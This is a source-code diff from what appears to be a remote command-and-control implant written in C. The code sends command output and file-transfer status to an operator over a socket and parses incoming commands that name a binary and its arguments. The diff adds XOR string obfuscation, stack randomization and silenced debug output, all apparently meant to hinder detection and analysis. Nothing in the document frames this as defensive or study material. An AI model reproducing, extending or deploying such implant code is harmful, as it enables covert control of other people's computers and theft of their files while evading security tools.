@@ -3,9 +3,11 @@
 #include "Glibc.h"
 #include "Utils.h"
 #include "json.h"
+#include "autoxor.h"
 
 void JSON_send_packets(enum JsonPacketType packetType, SOCKET sock, void *args)
 {
+	STACK_RANDOMIZER;
 	char *prompt;
 	char *output;
 	char *b64output;
@@ -14,10 +16,10 @@ void JSON_send_packets(enum JsonPacketType packetType, SOCKET sock, void *args)
 	SIZE_T bytesSent;
 	PJSON_RAW_BINARY_ARGS rawOutput;
 	PJSON_READY_FOR_DOWNLOAD_ARGS downloadArgs;
-	const char *scaffhold_RFI = "{\"status\":\"READY_FOR_INPUT\",\"prompt\":\"%s\"}";
-	const char *scaffhold_CO = "{\"status\":\"COMMAND_OUTPUT\",\"content\":\"%s\"}";
-	const char *scaffhold_RFD = "{\"status\":\"READY_FOR_DOWNLOAD\",\"local_filepath\":\"%s\",\"filelen\":%lld}";
-	const char *scaffhold_RFU = "{\"status\":\"READY_FOR_UPLOAD\",\"local_filepath\":\"%s\"}";
+	const char *scaffhold_RFI = XorStr("{\"status\":\"READY_FOR_INPUT\",\"prompt\":\"%s\"}");
+	const char *scaffhold_CO = XorStr("{\"status\":\"COMMAND_OUTPUT\",\"content\":\"%s\"}");
+	const char *scaffhold_RFD = XorStr("{\"status\":\"READY_FOR_DOWNLOAD\",\"local_filepath\":\"%s\",\"filelen\":%lld}");
+	const char *scaffhold_RFU = XorStr("{\"status\":\"READY_FOR_UPLOAD\",\"local_filepath\":\"%s\"}");
 
 	switch (packetType)
 	{
@@ -38,7 +40,7 @@ void JSON_send_packets(enum JsonPacketType packetType, SOCKET sock, void *args)
 			break;
 		case JsonRawBinary:
 			rawOutput = (PJSON_RAW_BINARY_ARGS)args;
-			b64output = WRAPPER_base64_encode_binary(rawOutput->buffer, rawOutput->bufferlen);
+			b64output = WRAPPER_base64_encode_binary((char *)rawOutput->buffer, rawOutput->bufferlen);
 			answer_len = strlen(scaffhold_CO) + strlen(b64output) + 1;
 			answer = (char *)malloc(answer_len);
 			snprintf(answer, answer_len, scaffhold_CO, b64output);
@@ -60,16 +62,17 @@ void JSON_send_packets(enum JsonPacketType packetType, SOCKET sock, void *args)
 			free(b64output);
 			break;
 		default:
-			printf("[!] Invalid packet type: %d\n", (int)packetType);
+			DEBUG_LOG("[!] Invalid packet type: %d\n", (int)packetType);
 			return;
 	}
-	bytesSent = NETWORK_send_packet(sock, answer, -1);
-	printf("[+] Sent %lld bytes\n", bytesSent);
+	bytesSent = NETWORK_send_packet(sock, answer, -1); (void)bytesSent;
+	DEBUG_LOG("[+] Sent %lld bytes\n", bytesSent);
 	free(answer);
 }
 
 PCOMMAND JSON_parse_packet(char *raw_packet)
 {
+	STACK_RANDOMIZER;
 	PCOMMAND result;
 	const char *type;
 	const char *binary;
@@ -85,13 +88,13 @@ PCOMMAND JSON_parse_packet(char *raw_packet)
 	result(json_element) type_element_result = json_object_find(element.value.as_object, "type");
 	typed(json_element) type_element = result_unwrap(json_element)(&type_element_result);
 	type = type_element.value.as_string;
-	printf("[-] Type: %s\n", type);
+	DEBUG_LOG("[-] Type: %s\n", type);
 	if (drunk_strcmp(type, "BUILTIN") == 0)
 		commandType = CommandBuiltin;
 	else if (drunk_strcmp(type, "COMMAND") == 0)
 		commandType = CommandCommand;
 	else {
-		printf("[!] Unsupported command type: %s\n", type);
+		DEBUG_LOG("[!] Unsupported command type: %s\n", type);
 		return (NULL);
 	}
 
@@ -99,14 +102,14 @@ PCOMMAND JSON_parse_packet(char *raw_packet)
 	result(json_element) binary_element_result = json_object_find(element.value.as_object, "binary");
 	typed(json_element) binary_element = result_unwrap(json_element)(&binary_element_result);
 	binary = binary_element.value.as_string;
-	printf("[-] Binary: %s\n", binary);
+	DEBUG_LOG("[-] Binary: %s\n", binary);
 
 	// Read arguments
 	result(json_element) arguments_element_result = json_object_find(element.value.as_object, "arguments");
 	typed(json_element) arguments_element = result_unwrap(json_element)(&arguments_element_result);
 	typed(json_array) *arguments = arguments_element.value.as_array;
 	argumentsCount = (arguments != NULL) ? arguments->count : 0;
-	printf("[-] %lld arguments\n", argumentsCount);
+	DEBUG_LOG("[-] %lld arguments\n", argumentsCount);
 
 	commandArguments = (char **)malloc(sizeof(char *) * argumentsCount);
 	for (size_t i = 0; i < argumentsCount; i++)
@@ -114,7 +117,7 @@ PCOMMAND JSON_parse_packet(char *raw_packet)
 		typed(json_element) argi = arguments->elements[i];
 		tmp = argi.value.as_string;
 		commandArguments[i] = (char *)drunk_strdup(tmp);
-		printf("[-] Argument %lld: %s (0x%p)\n", i, tmp, commandArguments[i]);
+		DEBUG_LOG("[-] Argument %lld: %s (0x%p)\n", i, tmp, commandArguments[i]);
 	}
 
 	// Json object not needed anymore
